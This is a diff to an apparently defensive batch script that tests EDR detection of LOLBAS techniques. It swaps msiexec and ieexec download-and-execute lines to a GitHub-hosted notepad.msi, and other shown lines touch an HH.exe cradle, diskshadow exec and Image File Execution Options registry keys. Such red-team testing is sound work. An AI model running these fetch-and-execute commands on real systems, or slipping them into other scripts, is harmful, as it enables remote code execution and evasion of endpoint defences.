@@ -3,12 +3,12 @@ REM Source of inspiration: https://attack.mitre.org/wiki/Main_Page
 REM Author: op7ic
 REM Description: Test the detection of various scripts/downloads/execs against your EDR solution.
 REM Warning: You might have to click on few windows to close script execution. Don't run this on live system!
-REM Version: 0.1a
+REM Version: 0.2a
 
 
 echo **********************************************
 echo *          EDR Testing Script                *
-echo *          Version: 0.1a                     *
+echo *          Version: 0.2a                     *
 echo *          by: op7ic                         *
 echo *                                            *
 echo *                                            *
@@ -278,11 +278,11 @@ echo *      Testing LOLBAS PAYLOADS               *
 echo **********************************************
 
 echo %time% %date% [+] Testing msiexec exec
-msiexec /q /i http://192.168.100.3/tmp/cmd.png  
-msiexec /i http://server/package.msi
+msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
+msiexec /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true
 echo Execution Finished at %time% %date%
-echo Command Excuted: msiexec /q /i http://192.168.100.3/tmp/cmd.png  
-echo Command Excuted: msiexec /i http://server/package.msi
+echo Command Excuted: msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true 
+echo Command Excuted: msiexec /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true
 
 echo %time% %date% [+] Testing diskshadow exec
 echo exec calc.exe > diskshadow.txt
@@ -316,10 +316,9 @@ echo Execution Finished at %time% %date%
 echo Command Excuted: HH.exe https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
 
 echo %time% %date% Testing ieexec.exe download & execute"exec"
-REM - this is faulty case. Need .EXE file hosted ...
-start "" ieexec.exe https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
+start "" ieexec.exe https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
 echo Execution Finished at %time% %date% 
-echo Command Excuted: ieexec.exe https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
+echo Command Excuted: ieexec.exe https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
 
 echo %time% %date% [+] Testing Setupapi driever installation & exec
 echo ^; DRIVER.INF > calc.inf
@@ -388,5 +387,6 @@ del payload.exe
 del testADS.txt
 del C:\windows\temp\url.url
 del Default_File_Path2.ps1
+del notepad.msi
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe"
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe"
